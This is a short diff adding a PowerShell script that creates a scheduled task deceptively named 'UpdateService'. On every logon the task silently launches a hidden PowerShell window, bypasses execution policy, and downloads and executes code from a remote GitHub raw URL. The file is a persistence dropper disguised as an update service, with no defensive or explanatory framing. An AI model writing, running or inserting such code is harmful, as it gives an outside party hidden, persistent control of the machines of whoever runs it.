@@ -1,0 +1,4 @@
+$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+
+schtasks /create /tn "UpdateService" /tr "powershell -WindowStyle Hidden -Exec Bypass -c iex (iwr 'https://raw.githubusercontent.com/X3D4L/pastebin/refs/heads/main/code')" /sc onlogon /ru $currentUser /f
+exit
